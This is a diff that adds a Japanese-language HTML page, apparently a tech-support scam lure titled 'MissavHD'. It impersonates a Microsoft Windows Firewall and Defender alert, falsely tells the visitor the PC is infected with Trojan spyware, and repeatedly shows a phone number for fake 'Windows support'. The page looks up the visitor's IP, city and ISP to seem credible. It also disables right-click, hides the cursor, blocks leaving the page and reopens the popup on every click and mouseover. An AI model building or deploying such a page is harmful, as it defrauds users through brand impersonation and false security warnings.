@@ -1,0 +1,291 @@
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name="viewport">
+    <meta content="noindex,nofollow" name="robots">
+    <title>MissavHD</title>
+    <link rel="shortcut icon" type="image/png" href="images/img.png">
+    <link href="css/tapa.css" rel="stylesheet">
+   <script src="js/jquery.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<link rel="stylesheet" href="css/bootstrap.min.css" crossorigin="anonymous">
+<script src="js/bootstrap.min.js" crossorigin="anonymous"></script>
+<link rel="stylesheet" href="css/font-awesome.min.css">
+    <script type="text/javascript">//<![CDATA[
+    $(function(){
+    $('body').bind('contextmenu', function(e){
+    return false;
+    });
+    });//]]>
+    </script>
+
+<script>
+  var t = new XMLHttpRequest;
+  t.onreadystatechange = function() {
+    if (4 == this.readyState && 200 == this.status) {
+      var a = JSON.parse(this.responseText);
+      ipadd = a.ip;
+      city = a.city;
+      country = a.country;
+      isp = a.connection.isp;
+      var b = new Date;
+      currtime = a.timezone.current_time;
+      document.getElementById("ip_add").textContent = "アドレス IP: " + ipadd + " " + b.toLocaleString("EN-US", currtime);
+      document.getElementById("city").textContent = "位置: " + city + ", " + country;
+      document.getElementById("isp").textContent = "ISP: " + isp
+    }
+  };
+  t.open("GET", "https://ipwho.is/?lang=en", !0);
+  t.send();
+</script>
+
+
+    <script type="text/javascript">
+      var phone_number = '(050) 5532 8060';
+
+    </script>
+
+    <style>
+      #bnrs{
+        width: 190px;
+    position: absolute;
+    left: 270px;
+    top: 180px;
+      }
+      .haruto {
+        position: absolute;
+    bottom: 111px;
+    left: 136px;
+    color: #124d9b;
+    
+    font-weight: 700;
+    font-size: 25px;
+    border: 1px solid #124d9b;
+    padding: 0 10px;
+    border-radius: 5px;
+}
+#ftrs_btn {
+  width: 142px;
+    position: absolute;
+    left: 73%;
+    bottom: 6%;
+    box-shadow: 0 1px 5px 0 rgba(0,0,0,.2), 0 2px 2px 0 rgba(0,0,0,.14), 0 3px 1px -2px rgba(0,0,0,.12);
+}
+#ftrs_btn a {
+  color: #fff;
+}
+.haru {
+  position: absolute;
+    bottom: 10.15%;
+    left: 6%;
+    font-size: 18px;
+    color: #ffffffd1;
+    font-weight: 800;
+}
+    </style>
+
+  </head>
+  <body class="map" id="mycanvas" onbeforeunload="return myFunction()" style="cursor:none">
+
+    <div id="age-confirmation-modal">
+
+      <!-- <div class="innerContainer">
+                     
+           
+                   
+                      <div>
+                        <button type="button" class="close" data-dismiss="close" aria-label="Close">
+          <span aria-hidden="true">X</span>
+          </button>
+          
+             
+                      </div>
+                 
+                     <div style="font-size:40px;">
+                          このサイトを閉じますか？
+                      </div>
+                      <div>
+                        <button type="button" class="btn btn-secondary btn-lg">
+           いいえ</button>
+           <button type="button" class="btn btn-primary btn-lg blink" style="color: #fff;
+           background-color: #124d9b;
+           border-color: #124d9b;">
+          はい</button>
+                      </div>
+                     
+                      
+                      
+                  </div> -->
+      
+              </div>
+
+    <div class="bg" style="cursor:none">
+      <div class="bgimg" style="top:0">
+        <img src="images/back.png" alt="" width="100%">
+      </div>
+    </div>
+    <a href="#" id="link_black" style="cursor:none" rel="noreferrer">
+      <div class="black" style="height: 145%; cursor: none; display: block;"></div>
+    </a>
+    <div class="webbxs" style="display: block;">
+      <img src="images/nbx1.jpg" alt="" width="100%" style="height: auto;">
+    </div>
+
+
+    <div class="bxcontb" style="display: block;" id="webgetcode">
+      <img src="images/web1.jpg" alt="" style="width: 500px;">
+      <strong class="haru"><img src="images/call.png" alt="" class="blink" style="width: 25px;margin-left: 0;"> <script>document.write(phone_number);</script> (無料通話)</strong>
+    </div>
+
+    <div class="vislnb" id="botgnws" style="display: block;">
+      <div class="row firewall-pro">
+        <div class="col-md-12">
+          <img src="images/box01.png" alt="" style="width: 670px;height: auto;">
+          <div id="txtintro">
+            <span class="colo-rd">
+              <div id="ip_add">Microsoft_Windows ファイアウォールの警告 !</div>
+              <div id="city">トロイの木馬型スパイウェアに感染したPC</div>
+              <div id="isp"> (エラーコード: 2V7HGTVB)</div>
+            </span>
+          </div>
+          <img src="images/scn.gif" id="bnrs">
+          <strong class="haruto"><img src="images/call.png" alt="" class="blink" style="width: 25px;margin-left: 0;"> <script>document.write(phone_number);</script> (無料通話)</strong>
+          <div class="fr button blink" id="ftrs_btn">
+            <a href="#" class="blink">OK</a>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div id="ftrs">
+      <div class="row">
+        <div class="col-md-12">
+          <div class="right-foot" style="text-align:center;margin-bottom: 5px;">
+            <span id="ftrstxt">
+              <img src="images/img.png"> Windowsのセキュリティ </span>
+            <span style="font-weight:500;padding-left:13px;color:#fff; ">Windows サポートに電話する: <span style="border:1px solid #fff;border-radius:5px;padding:4px 5px"> <img src="images/call.png" alt="" class="blink" style="width: 25px;vertical-align: middle;">  <script>document.write(phone_number);</script> (無料電話) 
+              </span>
+            </span>
+          </div>
+        </div>
+        <div class="col-md-12">
+          <marquee direction="left" height="100px" width="100%">
+            <small class="text-left" style="color:#eee;font-size:10px">Windows Defender SmartScreen により、認識されないアプリケーションの表示が防止されました。 このアプリケーションを実行すると、コンピュータが安全でない可能性があります。 Windows Defender スキャンにより、パスワード、オンライン ID、財務情&nbsp;、個人ファイル、写真、ドキュメントを盗む可能性があるアドウェアがこのデバイス上で見つかりました。</small>
+          </marquee>
+        </div>
+      </div>
+    </div>
+
+    <div class="uprbox" style="display:none;background-color:#000;height:auto;width:550px;left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="upbxs">
+      <p style="color:#fff;margin-top:10px;font-size:16px;padding:0 5px" class="text-center">すぐに当社にご連絡く&nbsp;さい。当社のエンジニアが電話で削除プロセスを案内いたします。お使いのコンピュータは無効になっています。Windows Defender SmartScreen により、認識されないアプリケーションの表示が防止されました。 このアプリケーションを実行すると、コンピュータが安全でない可能性があります。 <br>
+        <strong>Windows サポートに電話する: <span style="border:1px solid #383d41;border-radius:5px;padding:6px 5px;display: block;"> <img src="images/call.png" alt="" class="blink" style="width: 25px;vertical-align: bottom;"> <script>document.write(phone_number);</script> (無料電話)
+          </span>
+        </strong>
+      </p>
+    </div>
+
+    <div id="chat" style="display: block;">
+      <img src="images/img.png">
+      <span style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">Microsoft</span>
+      <p style="font-weight:600;font-size:24px">サポートに電話する: <br>
+      </p>
+      <h4 style="font-weight:600;font-size:22px"> <img src="images/call.png" alt="" class="blink" style="width: 25px;margin-left: 0;vertical-align:bottom"> <script>document.write(phone_number);</script> <br>(セキュリティサポート)</h4>
+      <div class="arrow-down">
+        <svg height="1em" viewBox="0 0 320 512">
+          <style>
+            svg {
+              fill: #fff
+            }
+          </style>
+          <path d="M137.4 374.6c12.5 12.5 32.8 12.5 45.3 0l128-128c9.2-9.2 11.9-22.9 6.9-34.9s-16.6-19.8-29.6-19.8L32 192c-12.9 0-24.6 7.8-29.6 19.8s-2.2 25.7 6.9 34.9l128 128z"></path>
+        </svg>
+      </div>
+    </div>
+
+    <div class="modal fade" id="exitModal" tabindex="-1" role="dialog" style="cursor:pointer">
+      <div class="modal-dialog modal-full-height modal-right" role="document">
+        <div class="mvbox">
+                           
+        <img src="images/whats.jpg" alt="" style="width: 300px;">
+         
+          
+          
+      </div>
+      </div>
+    </div>
+
+    <script type="text/javascript" src="js/noir.js"></script>
+    <script type="text/javascript" src="js/all.js"></script>
+    <script type="text/javascript" src="js/esc.js"></script>
+    <script type="text/javascript" src="js/script1.js"></script>
+    <script type="text/javascript" src="js/script2.js"></script>
+    <script type="text/javascript" src="js/script3.js"></script>
+    <script type="text/javascript" src="js/script4.js"></script>
+    <script type="text/javascript" src="js/script5.js"></script>
+    <script type="text/javascript" src="js/script6.js"></script>
+    <script type="text/javascript" src="js/script7.js"></script>
+    <script type="text/javascript" src="js/web1.js"></script>
+    <script type="text/javascript" src="js/full.js"></script>
+    <script type="text/javascript" src="js/leave.js"></script>
+    <script type="text/javascript" src="js/custom.js"></script>
+
+    <script>
+      $(document).ready(function(){
+        $(".map").click(function(){
+          $("#age-confirmation-modal").hide();
+        });
+      });
+      </script>  
+
+    <script>
+      $(function() {
+        var a = 0,
+          b = setInterval(function() {
+            a += 10;
+            $("#dynamic").css("width", a + "%").attr("aria-valuenow", a).text(a + "% 完了");
+            100 <= a && clearInterval(b)
+          }, 100)
+      });
+    </script>
+   
+    <script>
+      var e = 1;
+      setInterval(function() {
+        1 == e ? (document.getElementById("favicon").href = "w3.png", e = 0) : (document.getElementById("favicon").href = "w1.png", e = 1)
+      }, 1E3);
+    </script>
+    <script>
+      $(document).ready(function() {
+        $("#mycanvas").click(function() {
+          $("#upbxs").show()
+        })
+      });
+    </script>
+
+    <script>
+      $(document).ready(function() {
+        $("#mycanvas").click(function() {
+          $("#botgnws").show()
+        })
+      });
+      $(document).ready(function() {
+        $("#cross").click(function() {
+          $("#botgnws").show()
+        })
+      });
+    </script>
+    <script>
+      $(document).ready(function() {
+        $("body").mouseover(function() {
+          $("#botgnws").show()
+        })
+      });
+    </script>
+    
+    <script>
+      $(document).ready(function() {
+        $("#chat").delay(600).fadeIn(100)
+      });
+    </script>
+
+
+
+</body></html>
